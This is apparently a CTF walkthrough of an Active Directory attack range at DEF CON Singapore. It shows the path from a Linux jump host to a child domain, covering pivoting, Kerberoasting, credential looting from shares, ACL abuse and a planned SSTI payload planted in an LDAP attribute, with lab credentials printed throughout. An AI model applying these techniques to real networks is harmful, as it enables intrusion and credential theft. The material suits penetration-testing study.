---
title: The Range Village
date: 2026-07-27
image: cover.png
tags: [Active Directory]
excerpt: A walkthrough of async.sg's Range Village at DEF CON Singapore - a 12-flag Active Directory range spanning a child domain, its parent, and a separate trusted forest. The path covers sudo and Polkit misconfigurations on a Linux jump host, NTLM relaying, Kerberoasting, SSTI-to-RCE on an internal web app, local privilege escalation via GodPotato, S4U2self abuse, cross-domain compromise through DCSync and inter-realm ticket capture, and ADCS template abuse in a third domain.
---

# DEF CON Singapore - The Range Village

The Range Village at DEF CON Singapore is a hands-on Active Directory attack range built and run by the team behind async.sg, the same people who teach the W200 Active Directory penetration testing course. Rather than a flat collection of unrelated boxes, the range is modelled as a small enterprise: a child domain (`dev.zenith.rv`) trusted by its parent (`zenith.rv`), which in turn maintains a forest trust with a separate management domain (`mgmt-zenith.rv`). Twelve flags are scattered across that environment, and each one is tied to a specific foothold, privilege escalation, or lateral movement technique instead of being an arbitrary gate to unlock.

This write-up documents my run through the range, from the initial SSH foothold on the jump server all the way into the second forest. I finished with 9 of the 12 flags before time ran out; the remaining three are left as an exercise for the reader - and for myself, next time.

A note on the output below: a handful of the rawest tool dumps (full process trees, a complete `secretsdump`, an exhaustive certificate template enumeration) have been trimmed to the parts that actually drive the attack path. Everything that mattered is still here; the noise is not. Every credential, hash, and IP address belongs to an ephemeral training environment and has no meaning outside of it.

## Range Details

{% image %}

There are 12 flags in total, spread across the three domains introduced above.

### Credentials

We are handed a single set of SSH credentials for the jump host, plus a low-privilege account in the child domain:

→ SSH Credentials ( 10.5.5.4 )

```c
rv_user
h0545NG4MgVo
```

→ Credentials for the `dev.zenith.rv` domain:

```c
dev\zenith-tester
P@ssw0rd123
```

### Internal Subnets Range

Three internal subnets sit behind the jump server, and none of them are routable until we pivot through it:

```c
10.5.10.0/24
10.5.20.0/24
10.5.30.0/24
```

## Foothold: The Jump Server

With the brief out of the way, it is time to actually work through the range. Everything begins on the jump server at `10.5.5.4`, the only host we can reach directly.

### Sudo Misconfiguration: redirect.sh

Upon connecting to the jump server and running `sudo -l`, we can see the following:

{% image2 %}

The `rv_user` account can run `/opt/redirect.sh` as root, with arbitrary arguments and no password. Reading the script explains why that matters:

```bash
rv_user@jmp:~$ cat /opt/redirect.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <listening_port> <remote_addr> <remote_port>"
    exit 1
fi

re_port='^[0-9]{1,5}$'
re_ip='^((25[0-5]|(2[0-4]|1[0-9]|[1-9]|)[0-9])\.){3}(25[0-5]|(2[0-4]|1[0-9]|[1-9]|)[0-9])$'

LPORT=$1
RADDR=$2
RPORT=$3

if [[ ! $LPORT =~ $re_port ]] || [ "$LPORT" -gt 65535 ]; then
    echo "Error: Invalid listening port '$LPORT'."
    exit 1
fi

if [[ ! $RPORT =~ $re_port ]] || [ "$RPORT" -gt 65535 ]; then
    echo "Error: Invalid remote port '$RPORT'."
    exit 1
fi

if [[ ! $RADDR =~ $re_ip ]]; then
    echo "Error: Invalid IPv4 address '$RADDR'."
    exit 1
fi

if ! command -v socat &> /dev/null; then
    echo "Error: 'socat' is not installed."
    exit 1
fi

SOCAT_ARGS=(
    "-v" "-d" "-d"
    "TCP-LISTEN:$LPORT,fork,reuseaddr"
    "TCP:$RADDR:$RPORT"
)

echo "----------------------------------------------------------"
echo "L-PORT: $LPORT  -->  REMOTE: $RADDR:$RPORT"
echo "Status: ACTIVE"
echo "----------------------------------------------------------"

if [ "$LPORT" -lt 1024 ]; then
    echo "NOTICE: Low port detected. This session will auto-terminate in 60s."

    socat "${SOCAT_ARGS[@]}" &
    SOCAT_PID=$!

    for i in {60..1}; do
        printf "\rTime remaining: %2d seconds... (Ctrl+C to stop early)" "$i"
        sleep 1
    done

    echo -e "\n\nTime expired. Cleaning up..."
    kill "$SOCAT_PID" 2>/dev/null
else
    echo "NOTICE: High port detected. Running indefinitely."
    echo "Press Ctrl+C to stop:"
    echo "----------------------------------------------------------"

    socat "${SOCAT_ARGS[@]}"
```

In short, the script is a thin wrapper around `socat` that forwards a local port on the jump server to an arbitrary remote host and port. Its input validation covers the shape of the arguments but never the destination, and because it runs as root, low ports such as 445 are fair game - the 60-second timeout is the only concession. That makes it a root-owned relay primitive sitting in the middle of the network. It looks harmless in isolation, and we will come back to it once we have something worth relaying.

### Host and Network Enumeration

With a shell as `rv_user`, the next step is standard host and network enumeration.

→ Hosts file:

```bash
rv_user@jmp:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 ubuntu2204

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.5.5.4 DEFCON-SG-jump-GTR jmp
127.0.1.1    DEFCON-SG-jump-GTR
```

→ Network enumeration:

```bash
rv_user@jmp:/$ ss -antup
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                    Process
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                            0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                            0.0.0.0:*
tcp                     ESTAB                    0                        52                                              10.5.5.4:22                                         10.5.5.254:49404
tcp                     LISTEN                   0                        128                                                 [::]:22                                               [::]:*
```

Only SSH and a local stub resolver - nothing else is listening.

→ Process list ( kernel threads trimmed; only the userland tree is interesting here ):

```bash
rv_user@jmp:/$ ps -aux --forest
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.3 167596 13188 ?        Ss   Mar18   0:08 /sbin/init autoinstall
root         381  0.0  0.5  56344 23776 ?        S<s  Mar18   0:02 /lib/systemd/systemd-journald
root         419  0.0  0.6 289312 27096 ?        SLsl Mar18   0:46 /sbin/multipathd -d -s
root         424  0.0  0.1  26300  6948 ?        Ss   Mar18   0:01 /lib/systemd/systemd-udevd
systemd+     458  0.0  0.1  89364  6592 ?        Ssl  Mar18   0:00 /lib/systemd/systemd-timesyncd
systemd+     472  0.0  0.2  16128  8156 ?        Ss   Mar18   0:00 /lib/systemd/systemd-networkd
systemd+     511  0.0  0.3  25668 12992 ?        Ss   Mar18   0:00 /lib/systemd/systemd-resolved
root         520  0.0  0.4  32768 19076 ?        Ss   Mar18   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         524  0.0  0.1 234504  6704 ?        Ssl  Mar18   0:00 /usr/libexec/polkitd --no-debug
root         811  0.0  0.0   6896  2976 ?        Ss   Mar18   0:00 /usr/sbin/cron -f -P
root        2077  0.0  0.2  15432  9728 ?        Ss   Mar18   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        7498  0.2  0.2  17216 11088 ?        Ss   17:04   0:00  \_ sshd: rv_user [priv]
rv_user     7587  0.0  0.2  17216  8072 ?        S    17:04   0:00      \_ sshd: rv_user@pts/0
rv_user     7588  0.0  0.1   8864  5748 pts/0    Ss   17:04   0:00          \_ -bash
rv_user     7667  0.0  0.1  10668  4028 pts/0    R+   17:08   0:00              \_ ps -aux --forest
root        4069  0.0  1.0 1998628 40392 ?       Ssl  Mar18   0:30 /usr/lib/snapd/snapd
```

A stock Ubuntu 22.04 host with our own SSH session at the bottom of the tree. No third-party agents, no interesting services.

→ ENV list:

```bash
rv_user@jmp:/$ env
SHELL=/bin/bash
PWD=/
LOGNAME=rv_user
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/rv_user
LANG=en_US.UTF-8
LS_COLORS=
SSH_CONNECTION=10.5.5.254 49404 10.5.5.4 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=alacritty
LESSOPEN=| /usr/bin/lesspipe %s
USER=rv_user
SHLVL=1
XDG_SESSION_ID=159
XDG_RUNTIME_DIR=/run/user/1001
SSH_CLIENT=10.5.5.254 49404 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
SSH_TTY=/dev/pts/0
_=/usr/bin/env
OLDPWD=/home
```

Nothing sensitive in the environment, though it is a small reminder that env vars leak just as much about an operator's own setup as they do about the target.

→ LinPEAS exploit suggester - the full output is long, so here are the candidates it flagged against the running `5.15.0-27-generic` kernel:

| CVE | Name | Exposure |
| --- | --- | --- |
| CVE-2022-32250 | `nft_object` UAF (NFT_MSG_NEWSET) | probable |
| CVE-2022-2586 | `nft_object` UAF | less probable |
| CVE-2022-0847 | Dirty Pipe | less probable |
| CVE-2021-4034 | PwnKit | less probable |
| CVE-2021-3156 | sudo Baron Samedit | less probable |
| CVE-2021-22555 | Netfilter heap OOB write | less probable |
| CVE-2017-5618 | setuid screen 4.5.0 LPE | less probable |

None of these were needed. The sudoers misconfiguration is a far more reliable route, so I did not chase any kernel exploits here - though on a real engagement they would all be worth validating.

→ LinPEAS also confirms the sudo finding from earlier, and surfaces something extra:

```bash
User rv_user may run the following commands on DEFCON-SG-jump-GTR:
    (root) NOPASSWD: /opt/redirect.sh *
Sudoers file: /etc/sudoers.d/localuser is readable
localuser ALL = (root) NOPASSWD: ALL
```

A separate `localuser` account has unrestricted root through sudo. We cannot use it without its password, but it is worth noting as a second misconfiguration on the same host - and the `localuser` name reappears later on almost every Windows box in the environment.

→ Polkit Binary:

```bash
══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 30872 Feb 26  2022 /usr/bin/pkexec
pkexec version 0.105
```

`pkexec` is present, SUID, and at a version that predates the PwnKit fix - matching the CVE-2021-4034 hit above. Again, a viable route to root that we simply did not need.

→ ARP Enumeration:

```bash
rv_user@jmp:~$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
10.5.5.254       0x1         0x2         bc:24:11:d8:7a:12     *        ens18
```

Only the gateway, which tells us the jump host has not been talking to anything in the internal subnets yet.

### Pivoting: SOCKS Proxy and Ping Sweep

To reach the internal subnets we open a dynamic SOCKS proxy over SSH and route our tooling through `proxychains4`. We could add `-f` to push the process into the background, but keeping it in the foreground means we notice immediately if the tunnel dies and can stop it cleanly:

{% image3 %}

Now in our `proxychains4.conf` we need to have the following lines:

```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

Now let's do a ping sweep to see which machines are available:

```bash
for i in {1..254}; do (ping -c 1 10.0.0.$i | grep "bytes from" &) ;done
```

→ 10.5.10.0/24 subnet:

```bash
rv_user@jmp:~$ for i in {1..254}; do (ping -c 1 10.5.10.$i | grep "bytes from" &) ;done
64 bytes from 10.5.10.8: icmp_seq=1 ttl=127 time=0.801 ms
64 bytes from 10.5.10.13: icmp_seq=1 ttl=127 time=0.968 ms
64 bytes from 10.5.10.14: icmp_seq=1 ttl=127 time=0.840 ms
64 bytes from 10.5.10.254: icmp_seq=1 ttl=64 time=0.234 ms
```

→ 10.5.20.0/24 subnet:

```bash
rv_user@jmp:~$ for i in {1..254}; do (ping -c 1 10.5.20.$i | grep "bytes from" &) ;done
64 bytes from 10.5.20.254: icmp_seq=1 ttl=64 time=0.220 ms
```

→ 10.5.30.0/24 subnet:

```bash
rv_user@jmp:~$ for i in {1..254}; do (ping -c 1 10.5.30.$i | grep "bytes from" &) ;done
64 bytes from 10.5.30.254: icmp_seq=1 ttl=64 time=0.178 ms
```

Only the `.10` subnet answers with real hosts; the other two show nothing but their routers. Another option is to use Ligolo or upload a static `nmap` binary to sweep the subnets properly - in this case I used the `nmap` method:

→ 10.5.10.0/24 subnet:

```bash
rv_user@jmp:/dev/shm$ ./nmap -sn 10.5.10.0/24
Starting Nmap 7.93SVN ( https://nmap.org ) at 2026-03-22 17:50 +08
Nmap scan report for 10.5.10.1
Host is up (0.00069s latency).
Nmap scan report for 10.5.10.2
Host is up (0.00061s latency).
Nmap scan report for 10.5.10.3
Host is up (0.00057s latency).
Nmap scan report for 10.5.10.4
Host is up (0.00053s latency).
Nmap scan report for 10.5.10.5
Host is up (0.00058s latency).
Nmap scan report for 10.5.10.6
Host is up (0.00054s latency).
Nmap scan report for 10.5.10.8
Host is up (0.0012s latency).
Nmap scan report for 10.5.10.13
Host is up (0.00081s latency).
Nmap scan report for 10.5.10.14
Host is up (0.00077s latency).
Nmap scan report for 10.5.10.157
Host is up (0.00060s latency).
Nmap scan report for 10.5.10.206
Host is up (0.00073s latency).
Nmap scan report for saturn-router (10.5.10.254)
Host is up (0.00063s latency).
```

→ 10.5.20.0/24 subnet:

```bash
rv_user@jmp:/dev/shm$ ./nmap -sn 10.5.20.0/24
Starting Nmap 7.93SVN ( https://nmap.org ) at 2026-03-22 17:50 +08
Nmap scan report for 10.5.20.1
Host is up (0.00070s latency).
Nmap scan report for 10.5.20.2
Host is up (0.00061s latency).
Nmap scan report for 10.5.20.3
Host is up (0.00057s latency).
Nmap scan report for 10.5.20.4
Host is up (0.00060s latency).
Nmap scan report for 10.5.20.5
Host is up (0.00056s latency).
Nmap scan report for 10.5.20.6
Host is up (0.00052s latency).
Nmap scan report for 10.5.20.97
Host is up (0.00078s latency).
Nmap scan report for 10.5.20.210
Host is up (0.00082s latency).
Nmap scan report for 10.5.20.254
Host is up (0.00042s latency).
```

→ 10.5.30.0/24 subnet:

```bash
rv_user@jmp:/dev/shm$ ./nmap -sn 10.5.30.0/24
Starting Nmap 7.93SVN ( https://nmap.org ) at 2026-03-22 17:51 +08
Nmap scan report for 10.5.30.1
Host is up (0.00061s latency).
Nmap scan report for 10.5.30.2
Host is up (0.00054s latency).
Nmap scan report for 10.5.30.3
Host is up (0.00050s latency).
Nmap scan report for 10.5.30.4
Host is up (0.00056s latency).
Nmap scan report for 10.5.30.5
Host is up (0.00050s latency).
Nmap scan report for 10.5.30.6
Host is up (0.00046s latency).
Nmap scan report for 10.5.30.173
Host is up (0.00057s latency).
Nmap scan report for 10.5.30.243
Host is up (0.00067s latency).
Nmap scan report for 10.5.30.254
Host is up (0.00028s latency).
```

The problem with these results is that many of the IPs are not actually reachable - they answer host discovery but refuse every TCP connection:

{% image4 %}

So we will stick to the `.10` subnet, since we can genuinely reach those IPs. From the earlier ping sweep we can also infer that the machines are running Windows, because the TTL ( Time To Live ) is 127 - Windows starts at 128 and loses one hop on the way to us, whereas Linux starts at 64:

```bash
64 bytes from 10.5.10.8: icmp_seq=1 ttl=127 time=0.801 ms
64 bytes from 10.5.10.13: icmp_seq=1 ttl=127 time=0.968 ms
64 bytes from 10.5.10.14: icmp_seq=1 ttl=127 time=0.840 ms
64 bytes from 10.5.10.254: icmp_seq=1 ttl=64 time=0.234 ms
```

The `.254` machine is the router, which is out of scope, so we will focus on `.8`, `.13`, and `.14`:

{% image5 %}

Let's add these machines to our `/etc/hosts` file:

```bash
➜  the_range_village cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.5.10.14	SQL01.dev.zenith.rv
10.5.10.13	DC02.dev.zenith.rv dev.zenith.rv
10.5.10.8	  FS01.dev.zenith.rv
```

We can see that SMB signing is disabled on the SQL01 and FS01 machines, which means we could potentially perform an NTLM relay against either of them. That observation becomes the pivot point later on, so it is worth writing down early.

## Enumerating the dev.zenith.rv Domain

### SMB - Authenticated Shares Enumeration

With the low-privilege `zenith-tester` account, the first question is what we can already read across the three hosts:

{% image6 %}

### DC02 - Shares and Password Policy

Trying to look inside the scripts folder on the domain controller, unfortunately we can't see anything:

{% image7 %}

→ Listing the domain password policy:

```bash
➜  the_range_village sudo proxychains4 -f /etc/proxychains4.conf -q netexec smb 10.5.10.13 -u 'zenith-tester' -p 'P@ssw0rd123' --pass-pol
SMB         10.5.10.13      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:dev.zenith.rv) (signing:True) (SMBv1:False)
SMB         10.5.10.13      445    DC02             [+] dev.zenith.rv\zenith-tester:P@ssw0rd123
SMB         10.5.10.13      445    DC02             [+] Dumping password info for domain: DEV
SMB         10.5.10.13      445    DC02             Minimum password length: 7
SMB         10.5.10.13      445    DC02             Password history length: None
SMB         10.5.10.13      445    DC02             Maximum password age: Not Set
SMB         10.5.10.13      445    DC02
SMB         10.5.10.13      445    DC02             Password Complexity Flags: 000000
SMB         10.5.10.13      445    DC02                 Domain Refuse Password Change: 0
SMB         10.5.10.13      445    DC02                 Domain Password Store Cleartext: 0
SMB         10.5.10.13      445    DC02                 Domain Password Lockout Admins: 0
SMB         10.5.10.13      445    DC02                 Domain Password No Clear Change: 0
SMB         10.5.10.13      445    DC02                 Domain Password No Anon Change: 0
SMB         10.5.10.13      445    DC02                 Domain Password Complex: 0
SMB         10.5.10.13      445    DC02
SMB         10.5.10.13      445    DC02             Minimum password age: None
SMB         10.5.10.13      445    DC02             Reset Account Lockout Counter: 10 minutes
SMB         10.5.10.13      445    DC02             Locked Account Duration: 10 minutes
SMB         10.5.10.13      445    DC02             Account Lockout Threshold: None
SMB         10.5.10.13      445    DC02             Forced Log off Time: Not Set
```

We did this because we don't want to lock out any accounts if we decide to spray passwords. With `Account Lockout Threshold: None`, spraying is safe here - a detail that is trivial to check and embarrassing to skip.

### DC02 - LDAP Username Enumeration

A single authenticated LDAP bind is enough to enumerate every user object in the domain:

{% image8 %}

### DNS Enumeration with adidnsdump

`adidnsdump` reads the AD-integrated DNS zone directly, which is usually the fastest way to map internal hostnames to addresses without touching every subnet by hand.

→ Command: `adidnsdump -u 'dev.zenith.rv\zenith-tester' -p 'P@ssw0rd123' DC02.dev.zenith.rv`

```bash
➜  the_range_village cat records.csv
type,name,value
A,web01,10.5.10.15
A,sql01,10.5.10.14
A,fs01,10.5.10.8
A,DomainDnsZones,10.5.10.13
A,dc02,10.5.10.13
A,@,10.5.10.13
NS,@,dc02.dev.zenith.rv.
```

This is the first sign of `web01` at `10.5.10.15` - a host that never appeared in the ping sweep, because ICMP to it is blocked. DNS knows about it anyway.

### BloodHound - Collecting over the Tunnel

Next we build a graph of the domain's ACLs, group memberships, and sessions.

→ Command: `sudo proxychains4 -f /etc/proxychains4.conf -q bloodhound-ce-python --domain dev.zenith.rv --username 'zenith-tester' --password 'P@ssw0rd123' --nameserver 10.5.10.13 --domain-controller DC02.dev.zenith.rv --collectionmethod all --zip`

{% image9 %}

Collecting through proxychains works but is painfully slow, so let's get a proper tunnel using Ligolo and do the scans through that instead:

→ Our attacking machine:

{% image10 %}

→ Victim machine:

{% image11 %}

Now inside of the ligolo session we need to do the following:

```bash
ifcreate
interface_route_add --name capablemadrox --route 10.5.0.0/16
start --tun capablemadrox
```

And now we can reach the machines:

{% image12 %}

→ Mapping the domain using BloodHound:

{% image13 %}

Now we need to upload this zip to the BloodHound UI and see what we can do from here:

{% image14 %}

### FS01 - NMAP Scanning

With the tunnel up, a full TCP scan of each host completes the picture.

```bash
Open 10.5.10.8:22
Open 10.5.10.8:139
Open 10.5.10.8:135
Open 10.5.10.8:445
Open 10.5.10.8:3389
Open 10.5.10.8:5985
Open 10.5.10.8:5986
```

OpenSSH on a Windows file server is unusual and worth remembering - it becomes our preferred shell on this box later.

### SQL01 - NMAP Scanning

```bash
Open 10.5.10.14:22
Open 10.5.10.14:135
Open 10.5.10.14:139
Open 10.5.10.14:445
Open 10.5.10.14:1433
Open 10.5.10.14:3389
Open 10.5.10.14:5986
Open 10.5.10.14:5985
Open 10.5.10.14:47001
Open 10.5.10.14:49664
Open 10.5.10.14:49671
Open 10.5.10.14:49667
Open 10.5.10.14:49665
Open 10.5.10.14:49668
Open 10.5.10.14:49666
Open 10.5.10.14:49669
Open 10.5.10.14:49672
Open 10.5.10.14:49670
```

Port 1433 confirms the MSSQL instance the hostname promised.

### DC02 - NMAP Scanning

```bash
Open 10.5.10.13:22
Open 10.5.10.13:53
Open 10.5.10.13:139
Open 10.5.10.13:135
Open 10.5.10.13:88
Open 10.5.10.13:389
Open 10.5.10.13:445
Open 10.5.10.13:464
Open 10.5.10.13:593
Open 10.5.10.13:636
Open 10.5.10.13:3268
Open 10.5.10.13:3269
Open 10.5.10.13:3389
Open 10.5.10.13:5985
Open 10.5.10.13:5986
Open 10.5.10.13:9389
```

Kerberos, LDAP, the global catalog, and AD Web Services - a textbook domain controller.

### BloodHound - Trusts, Admins and Kerberoastable Users

With data in BloodHound, we can start asking it questions.

→ Domain Trusts:

{% image15 %}

Already at this stage the graph shows `dev.zenith.rv` is not alone. For this we could also use `powerview.py` to confirm exactly what the trust between those two domains looks like.

→ All Domain Admins:

{% image16 %}

→ Kerberoastable Users:

{% image17 %}

### Kerberoasting a Service Account

Kerberoasting works because any authenticated domain user can request a service ticket for any account that has a Service Principal Name set, and part of that ticket is encrypted with a key derived from the service account's password. If the password is weak, it can be cracked entirely offline, with no further traffic to the domain. So let's try to dump the hashes and crack them:

{% image18 %}

And we can see that we found a password for one of these users:

{% image19 %}

Now let's confirm which user this password belongs to using netexec:

{% image20 %}

This user is a member of the `SERVICE-ACCOUNTS` group:

{% image21 %}

And it has an SPN registered on the following:

{% image22 %}

### SVC-VDI - Share Access

{% image23 %}

With this account we can access the `CommonSvcHome$` share. But before doing this let's enumerate the shares as the initial user, since we didn't do this yet - it is worth knowing exactly what the low-privilege account could and could not see, because that difference is the finding.

### FS01 - Share Enumeration as the Initial User

→ Ingest Share: ( Temporary share for data ingestion )

```bash
# use Ingest
# ls
drw-rw-rw-          0  Wed Mar 18 07:45:38 2026 .
drw-rw-rw-          0  Wed Mar 18 07:47:14 2026 ..
-rw-rw-rw-          0  Wed Mar 18 07:45:38 2026 .empty
# get .empty
#
```

→ Contents of the .empty file:

```bash
➜  the_range_village file .empty
.empty: empty
➜  the_range_village hexdump .empty
➜  the_range_village
```

→ Ops Share: ( Share used during live operations )

```bash
# use Ops
# ls
drw-rw-rw-          0  Sun Mar 22 12:27:49 2026 .
drw-rw-rw-          0  Wed Mar 18 07:47:14 2026 ..
-rw-rw-rw-          0  Wed Mar 18 07:45:00 2026 .empty
```

→ Public Share: ( Share used for general file sharing )

```bash
# use Public
ls
# ls
drw-rw-rw-          0  Sun Mar 22 12:27:53 2026 .
drw-rw-rw-          0  Wed Mar 18 07:47:14 2026 ..
-rw-rw-rw-          0  Wed Mar 18 07:45:19 2026 .empty
```

→ zenith.archive: ( Share is no longer used )

```bash
# use zenith.archive
# ls
drw-rw-rw-          0  Wed Mar 18 07:45:56 2026 .
drw-rw-rw-          0  Wed Mar 18 07:47:14 2026 ..
-rw-rw-rw-          0  Wed Mar 18 07:45:56 2026 .empty
```

→ TX_{dcd6c76b-a180-4cc5-93be-ecce1519dbf5}$: ( Experimental share for Project TX )

```bash
➜  the_range_village smbclient '//10.5.10.8/TX_{dcd6c76b-a180-4cc5-93be-ecce1519dbf5}$' -U dev.zenith.rv/zenith-tester
Password for [DEV.ZENITH.RV\zenith-tester]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 18 07:46:10 2026
  ..                                  D        0  Wed Mar 18 07:47:14 2026
  .empty                              A        0  Wed Mar 18 07:46:09 2026

		65535487 blocks of size 4096. 60689775 blocks available
```

Every share the low-privilege account can reach holds nothing but a placeholder file. Since these shares are world-writable, though, the `Ops` share is a natural candidate for NTLM theft - dropping a file that coerces any user browsing the directory into authenticating to us:

{% image24 %}

But after waiting for a while we didn't get any callbacks. Nobody browses these shares, so there is no authentication to steal.

### SVC-VDI - Looting CommonSvcHome$ (Flag 1)

The Kerberoasted service account, on the other hand, has access to a share the initial user could not even see:

```bash
# use CommonSvcHome$
# ls
drw-rw-rw-          0  Sun Mar 22 12:25:43 2026 .
drw-rw-rw-          0  Wed Mar 18 07:47:14 2026 ..
-rw-rw-rw-         60  Wed Mar 18 07:57:20 2026 flag1.txt
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 scripts
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 _tx
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 _vdi
```

→ Getting the first flag:

```bash
RV{RO4$TinG_7O_open_5h@r3$_7f27d5cbab743af91a26e17a9bfb4b5a}
```

→ Scripts folder:

```bash
# cd scripts
# ls
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 .
drw-rw-rw-          0  Sun Mar 22 12:25:43 2026 ..
-rw-rw-rw-        194  Wed Mar 18 07:46:31 2026 cleanup.ps1
-rw-rw-rw-        399  Wed Mar 18 07:46:31 2026 inv.ps1
-rw-rw-rw-        221  Wed Mar 18 07:46:31 2026 migrate.ps1
```

→ Cleanup Script:

```bash
➜  common_svc_home cat cleanup.ps1
$path = "C:\Users\Public\Downloads"
$limit = (Get-Date).AddDays(-30)
Get-ChildItem -Path $path -Recurce | Where-Object { !$_.PSIsContainer -and $_.LastWriteTime -lt $limit } | Remove-Item -Force
```

→ Inv Script:

```bash
➜  common_svc_home cat inv.ps1
$target = "C:\Projects"
Get-ChildItem -Path $target | Where-Object { $_.PSIsContainer } | ForEach-Object {
    $stats = Get-ChildItem -Path $_.FullName -Recurse -File | Measure-Object -Property Length -Sum
    [PSCustomObject]@{
        FolderName = $_.Name
        FileCount  = $stats.Count
        TotalSize  = $stats.Sum
    }
} | Export-Csv -Path "C:\Temp\FolderInventory.csv" -NoTypeInformation
```

→ Migrate Script:

```bash
➜  common_svc_home cat migrate.ps1
$src = "C:\Logs\Raw"
$dest = "C:\Logs\Archive"
Get-ChildItem -Path $src -Filter *.txt | ForEach-Object {
    $newName = $_.BaseName + ".log"
    Move-Item -Path $_.FullName -Destination (Join-Path $dest $newName) -Force
}
```

None of the three scripts are exploitable in themselves - note the typo'd `-Recurce` in `cleanup.ps1`, which means it never even runs. Still, maintenance scripts on a writable share are always worth reading; the payoff here is one folder over.

→ _vdi folder:

```bash
# cd _vdi
# ls
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 .
drw-rw-rw-          0  Sun Mar 22 12:25:43 2026 ..
-rw-rw-rw-       2892  Wed Mar 18 07:46:31 2026 .log
-rw-rw-rw-        939  Wed Mar 18 07:46:31 2026 az.py
-rw-rw-rw-        568  Wed Mar 18 07:46:31 2026 get_all_pools.py
-rw-rw-rw-        939  Wed Mar 18 07:46:31 2026 reboot.py
```

The script `get_all_pools.py` is interesting because it tells us the endpoint for the VDI and also the accounts we can log in as:

{% image25 %}

Another one is `reboot.py`, which also tells us something that we will need to do later:

{% image26 %}

Inside the `.log` file we have some credentials in clear text - the classic case of a script logging exactly what it should not:

{% image27 %}

Credentials: `adrian.wong@dev.zenith.rv : nSEWYKH2Nu5L`

If we look this user up in BloodHound, they are a member of the `FS-ADMINS` group:

{% image28 %}

→ _tx folder:

```bash
# cd _tx
# ls
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 .
drw-rw-rw-          0  Sun Mar 22 12:25:43 2026 ..
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 app
# cd app
# ls
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 .
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 ..
-rw-rw-rw-       8317  Wed Mar 18 07:46:31 2026 app.py
-rw-rw-rw-        760  Wed Mar 18 07:46:31 2026 config.py
-rw-rw-rw-         65  Wed Mar 18 07:46:31 2026 requirements.txt
drw-rw-rw-          0  Wed Mar 18 07:46:31 2026 templates
```

This is the source code of the application running on WEB01, which is a significant find - we get to review the target's code before ever touching it. A quick pass through `app.py` and its templates (with an LLM helping to summarise the review) highlights the following:

{% image29 %}

{% image30 %}

Keep the template-rendering path in mind; it comes back with a vengeance once we can actually authenticate to the application.

## Lateral Movement Across dev.zenith.rv

### FS01 - Foothold as adrian.wong (Flag 2)

If we spray these credentials to other services we can see that we can access both SSH and WinRM:

{% image31 %}

So let's connect and see what we got:

{% image32 %}

Inside this Desktop folder we can find the 2nd flag:

{% image33 %}

Flag: `RV{4nD_5O_It_B3GiNS_9c0fa9d0d89b2a69d79663ce69795017}`

If we try to ping the web01 machine from this machine we can see that we can reach it - the host that was invisible from our own vantage point is one hop away from here:

{% image34 %}

So let's upload a ligolo agent here to be able to access WEB01:

{% image35 %}

Now on our ligolo proxy let's create a listener that will redirect the ligolo traffic to localhost:

```bash
interface_create
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

{% image36 %}

Notice that we use the connect address of the jump server - the agent on FS01 cannot reach us directly, so it calls back through the host we already control - and then:

```bash
interface_route_add --name sacredbouillaba --route 10.5.10.0/24
start --tun sacredbouillaba
```

And now we are able to ping the WEB01 machine and scan it:

{% image37 %}

→ NMAP Scanning:

```bash
Open 10.5.10.15:22
Open 10.5.10.15:443
```

If we try to access this page we can see the following:

{% image38 %}

But if we try to log in using the AD credentials it doesn't work, because the user must be in the Service Admins group, and the only users inside that group are:

{% image39 %}

So let's look at our own rights instead:

{% image40 %}

We can also use `impacket-dacledit`: `impacket-dacledit -action read -target 'adrian.wong' dev.zenith.rv/adrian.wong:'nSEWYKH2Nu5L'`

{% image41 %}

Looking through this output we can see that we can modify ACE[16]:

```bash
Access mask: ReadProperty, WriteProperty
Object type: Personal-Information
Trustee: Principal Self
```

`Principal Self` on the `Personal-Information` property set means the account can write its own attributes in that set - including `mobile`. Combined with what we saw in the application source, that means we can get RCE once we can log into the application, because we control a value the app renders. We would just need to trigger it with something like `curl https://target/api/user/adrian.wong`, having first set the attribute with `bloodyad ... set object 'CN=Adrian Wong,...' mobile "{{7*7}}"`.

